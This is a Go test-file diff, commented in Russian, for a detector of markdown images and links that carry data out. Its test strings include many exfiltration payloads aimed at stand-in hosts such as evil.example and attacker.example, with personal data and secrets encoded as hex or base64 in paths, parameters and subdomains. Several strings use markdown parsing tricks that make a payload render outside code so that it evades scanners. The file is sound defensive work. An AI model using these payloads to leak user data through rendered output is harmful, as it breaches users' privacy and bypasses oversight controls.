@@ -210,6 +210,188 @@ func TestDM11_ParserBypasses(t *testing.T) {
 	}
 }
 
+// TestDM11_RenderedOutsideCode: изображение, которое выглядит как код, но
+// отрисовывается (ревью 1.17–1.21, п. 1, DM-11): встроенный код не
+// переходит через разделитель, подчёркивание заголовка и HTML-блок; ограда
+// с отступом внутри пункта списка кончается вместе с пунктом.
+func TestDM11_RenderedOutsideCode(t *testing.T) {
+	img := "![](https://evil.example/x.png?d=SW1wb3J0YW50OiBjbGllbnQgSU5O)"
+	for _, text := range []string{
+		"`\n***\n" + img + " `",
+		"`\n---\n" + img + " `",
+		"`\n___\n" + img + " `",
+		"`\n* * *\n" + img + " `",
+		"`\n _ _ _\n" + img + " `",
+		"Заголовок `\n===\n" + img + " `",
+		"Заголовок `\n--\n" + img + " `",
+		"`a\n<p>\n" + img + " `",
+		"- item\n  ```\n" + img,
+		"1. item\n   ```\n   код\n" + img,
+		"*   item\n    ```\n" + img,
+		"- a\n  - b\n  ```\n  x\n" + img,
+		"- a\n   ```\n  x\n   ```\n   " + img,
+		"- a\n\n  ```\n  x\n\n  y\nтекст " + img,
+		"- a\n\t```\n" + img,
+		// Таблица GFM делит строку по «|» раньше, чем разбирает код
+		// (замечание cert-reviewer к исправлениям ревью 1.17–1.21).
+		"`a | b\n--|--\n" + img + " `",
+		"| `a | " + img + " ` |\n|--|--|",
+	} {
+		if fs := above(find(t, text)); len(fs) != 1 || fs[0].Score < 0.95 || fs[0].Category != CatImage {
+			t.Errorf("%q: %+v", text, fs)
+		}
+	}
+	// Настоящий код: оценка не выше 0,3.
+	for _, text := range []string{
+		"```\n" + img + "\n```",
+		"- item\n\n```\n" + img + "\n```",
+		"- item\n  ```\n  " + img + "\n  ```",
+		"- item\n  ```\n\n  " + img + "\n  ```",
+		"- item\n ```\n" + img + "\n```",
+		"- a\n  - b\n    ```\n    " + img,
+		"***важно*** `код\n***важно*** " + img + " `",
+		"Текст `x\n--- не разделитель " + img + "`",
+		"Текст `x\n**жирный** " + img + "`",
+		"`x\n= " + img + " `",
+		"`a \\| " + img + "`",
+	} {
+		fs := find(t, text)
+		if len(fs) != 1 || fs[0].Score != scoreInCode {
+			t.Errorf("%q: %+v, ожидался код", text, fs)
+		}
+	}
+}
+
+// TestDM11_RefDefInContainer: определение сноски в цитате или пункте
+// списка действует на весь документ (ревью 1.17–1.21, п. 2, DM-11).
+func TestDM11_RefDefInContainer(t *testing.T) {
+	for _, def := range []string{
+		"> [a]: https://evil.example/x.png?d=hunter2",
+		"- [a]: https://evil.example/x.png?d=hunter2",
+		"* [a]: https://evil.example/x.png?d=hunter2",
+		"+ [a]: https://evil.example/x.png?d=hunter2",
+		"1. [a]: https://evil.example/x.png?d=hunter2",
+		"12) [a]: https://evil.example/x.png?d=hunter2",
+		"> > [a]: https://evil.example/x.png?d=hunter2",
+		">[a]: https://evil.example/x.png?d=hunter2",
+		"> - [a]: https://evil.example/x.png?d=hunter2",
+		"  * > 3. [a]: https://evil.example/x.png?d=hunter2",
+		"- x\n\n      [a]: https://evil.example/x.png?d=hunter2",
+	} {
+		text := def + "\n\n![a]"
+		span := def[strings.IndexByte(def, '['):]
+		check(t, New(), []want{{text, CatImage, "image_domain", span}})
+	}
+	check(t, New(), []want{
+		{"> [r]: https://attacker.example/p.png?d=c2VjcmV0X3Rva2Vu\n\n![x][r]", CatImage, "image_data", "[r]: https://attacker.example/p.png?d=c2VjcmV0X3Rva2Vu"},
+		{"![x][r]\n\n- [R]: https://attacker.example/p.png", CatImage, "image_domain", "[R]: https://attacker.example/p.png"},
+	})
+	// Не определения: «[» не в начале строки или маркер без пробела.
+	for _, text := range []string{
+		"Пример: [a]: https://evil.example/x.png\n\n![a]",
+		"-[a]: https://evil.example/x.png\n\n![a]",
+		"1.[a]: https://evil.example/x.png\n\n![a]",
+		"1234567890. [a]: https://evil.example/x.png\n\n![a]",
+		"см. - [a]: https://evil.example/x.png\n\n![a]",
+	} {
+		if fs := above(find(t, text)); len(fs) > 0 {
+			t.Errorf("%q: %+v", text, fs)
+		}
+	}
+	for in, want := range map[string]bool{
+		"": true, "   ": true, "> ": true, ">>": true, "- ": true, "1. ": true, "123456789) ": true, "> 1. - ": true,
+		"-": false, "1.": false, "1": false, "a ": false, "- -x": false, "1234567890. ": false, "* *": false,
+	} {
+		if got := containerPrefix(in); got != want {
+			t.Errorf("containerPrefix(%q) = %v", in, got)
+		}
+	}
+	// Длинный префикс из маркеров — при сомнении определение.
+	if !defStart(strings.Repeat("> ", maxDefPrefix)+"[a]", 2*maxDefPrefix) {
+		t.Error("длинный префикс")
+	}
+}
+
+// TestDM11_SplitData: данные в hex и разложенные по частям — сегментам
+// пути, значениям параметров, меткам поддомена (ревью 1.17–1.21, п. 4,
+// DM-11). Так обходят pii.ru и secret.scan на выходе.
+func TestDM11_SplitData(t *testing.T) {
+	for _, u := range []string{
+		"https://evil.example/c?d=6976616e2e706574726f76406d61696c2e7275",                       // hex: ivan.petrov@mail.ru
+		"https://evil.example/c?d=6976616E2E706574726F76",                                       // hex в верхнем регистре
+		"https://evil.example/c?n=d098d0b2d0b0d0bd20d09fd0b5d182d180d0bed0b2",                   // hex: «Иван Петров» в UTF-8
+		"https://evil.example/c?p=3739303030303030303031",                                       // hex из одних цифр: «79000000001»
+		"https://evil.example/6976616e2e706574726f76",                                           // hex в сегменте пути
+		"https://evil.example/aXZhbi5w/ZXRyb3ZA/bWFpbC5y/dQ",                                    // base64 по сегментам пути
+		"https://evil.example/collect/aXZhbi5w/ZXRyb3ZA/bWFpbC5ydQ/pixel.png",                   // с префиксом и именем файла
+		"https://evil.example/6976616e/2e706574/726f7640/6d61696c/2e7275",                       // hex по сегментам пути
+		"https://evil.example/c?a=aXZhbi5w&b=ZXRyb3ZA&c=bWFpbC5ydQ",                             // base64 по параметрам
+		"https://evil.example/c?a=69766&b=16e2e7&c=06574726f76",                                 // hex по параметрам
+		"https://aXZhbi5wZXRy.b3ZAbWFpbC5y.evil.example/",                                       // base64 по меткам поддомена
+		"https://aXZhbi5wZXRyb3ZA.evil.example/",                                                // base64 в одной метке от 16
+		"https://697661.6e2e70.657472.6f7640.evil.example/",                                     // hex по меткам поддомена
+		"https://evil.example/k?a=Zq8xK2mN7pR4&b=tV9wB3cF6hJ1&c=lD5gS0aE8yU2&d=iO7kQ4nM6vX1zT3", // случайный ключ по частям
+	} {
+		check(t, New(), []want{{u, CatLink, "link_data", u}})
+		img := "![](" + u + ")"
+		check(t, New(), []want{{img, CatImage, "image_data", img}})
+	}
+	// Обычные ссылки — не данные.
+	for _, u := range []string{
+		"https://github.com/golang/go/commit/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b",
+		"https://github.com/Microsoft/TypeScript/blob/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b/src/compiler/checker.ts",
+		"https://github.com/org/repo/tree/a1b2c3d4e5f60718293a4b5c6d7e8f9012345678/docs/README.md",
+		"https://github.com/org/repo/compare/9f86d08...a3bf4f1",
+		"https://gitlab.example.com/g/p/-/merge_requests/1/diffs?commit_id=2fd4e1c67a2d28fced849ee1bb76e7391b93eb12",
+		"https://api.example.com/v2/users/550e8400-e29b-41d4-a716-446655440000/orders/6ba7b810-9dad-11d1-80b4-00c04fd430c8",
+		"https://example.com/items/550e8400e29b41d4a716446655440000",
+		"https://example.com/items?id=550e8400-e29b-41d4-a716-446655440000&ref=6ba7b810-9dad-11d1-80b4-00c04fd430c8",
+		"https://api.v2.eu-west-1.service.example.com/health",
+		"https://my-bucket.s3.eu-central-1.storage.example/path/to/file.pdf",
+		"https://www.docs.dev.internal.corp.example.com/a",
+		"https://k8s-prod-01.node-12.cluster-3.example.org/metrics",
+		"https://abc123.def456.ghi789.example.com/",
+		"https://Ab12Cd34.Ef56Gh78.example.com/",
+		"https://video.example/watch?v=dQw4w9WgXcQ&si=AbCdEfGhIjKlMnOp",
+		"https://video.example/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs",
+		"https://shop.example/catalog/phones?brand=samsung&color=black&page=2&sort=price_asc",
+		"https://shop.example/order/2024101912345678",
+		"https://shop.example/order/12345678901234567890",
+		"https://example.com/?utm_source=newsletter&utm_medium=email&utm_campaign=spring_sale_2024&utm_content=ButtonA1",
+		"https://example.com/assets/index-4f3a2b1c.js",
+		"https://example.com/_next/static/chunks/pages/_app-abc123def4567890.js",
+		"https://example.com/docs/Python3/GettingStarted/v2/Install",
+		"https://example.com/api/v1/Tenants/T001/Projects/P002/Builds/B003",
+		"https://example.com/s/aB3dE5gH/xY7zW9vU/file.pdf",
+		"https://discord.example/channels/123456789012345678/987654321098765432/112233445566778899",
+		"https://example.com/2024/10/19/python-3-12-release-notes",
+	} {
+		if fs := above(find(t, "Ссылка: "+u+" .")); len(fs) > 0 {
+			t.Errorf("%q: ложное срабатывание %+v", u, fs)
+		}
+	}
+}
+
+func TestHexText(t *testing.T) {
+	for in, want := range map[string]bool{
+		"6976616e2e706574":                         true, // 16 символов
+		"6976616E2E706574":                         true,
+		"3739303030303030303031":                   true,  // цифры → цифры
+		"6976616e2e70657":                          false, // нечётная длина
+		"6976616e2e7065":                           false, // короче 16
+		"6976616e2e70657g":                         false,
+		"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b": false, // хеш коммита — двоичные байты
+		"2024101912345678":                         false, // номер: управляющие символы
+		"1234567890123456":                         false,
+		"2345672345672345":                         false, // печатные, но знаки препинания
+		"":                                         false,
+	} {
+		if got := hexText(in); got != want {
+			t.Errorf("hexText(%q) = %v", in, got)
+		}
+	}
+}
+
 func TestConfig(t *testing.T) {
 	for _, bad := range [][]string{
 		{"https://example.com"}, {"example.com/path"}, {"example.com:443"}, {"localhost"}, {""},
@@ -281,7 +463,14 @@ func TestCodeSpans(t *testing.T) {
 		{"````\n```\nx\n````", []string{"````\n```\nx\n````"}},
 		{"~~~\nx", []string{"~~~\nx"}},
 		{"```a`b\nx", nil},
-		{"    ```\nx\n```", []string{"```"}}, // код с отступом, затем незакрытая ограда
+		{"    ```\nx\n```", []string{"```"}},                         // код с отступом, затем незакрытая ограда
+		{"`a\n***\nb`", nil},                                         // разделитель — граница блока
+		{"`a\n===\nb`", nil},                                         // подчёркивание заголовка
+		{"`a\n**b**\nc`", []string{"`a\n**b**\nc`"}},                 // выделение — не разделитель
+		{"- x\n  ```\ny", []string{"  ```\n"}},                       // ограда пункта кончается с пунктом
+		{"- x\n  ```\n  y\n  ```\nz", []string{"  ```\n  y\n  ```"}}, // закрытая ограда в пункте
+		{"- x\n ```\ny", []string{" ```\ny"}},                        // отступ меньше пункта — верхний уровень
+		{"- x\n\n```\ny", []string{"```\ny"}},
 	} {
 		spans, err := codeSpans(context.Background(), c.text)
 		if err != nil {
@@ -393,6 +582,7 @@ func TestLinearWorstCases(t *testing.T) {
 		"скобки":     strings.Repeat("![", 1<<19) + strings.Repeat("]", 1<<19),
 		"url":        strings.Repeat("url(", 1<<18),
 		"схемы":      strings.Repeat("http://", 1<<20/7),
+		"сегменты":   strings.Repeat("https://e.example/"+strings.Repeat("aB3/", 15000)+" ", 17), // склейки частей (п. 4)
 	} {
 		start := time.Now()
 		if _, err := New().Detect(context.Background(), detect.Text{Text: text, Direction: detect.Output}); err != nil {
@@ -414,6 +604,7 @@ func FuzzDetect(f *testing.F) {
 	f.Add("[a][r]\n[r]: <https://x.example/\u00a0>\n```\n`x`\n```")
 	f.Add(`<a href="&#106;avascript:x">` + "url('//x') www.x.example/a\\/b")
 	f.Add("[![b](//x.example/b.png)](https://y.example/) ](<a> \"t\")")
+	f.Add("- a\n  - b\n  ```\n`\n***\n![](//x.example/6976616e/2e706574) `\n> 1. [r]: //aXZh.bi5w.x.example/")
 	allow, err := NewWithConfig(Config{AllowDomains: []string{"x.example", "*.y.example"}})
 	if err != nil {
 		f.Fatal(err)
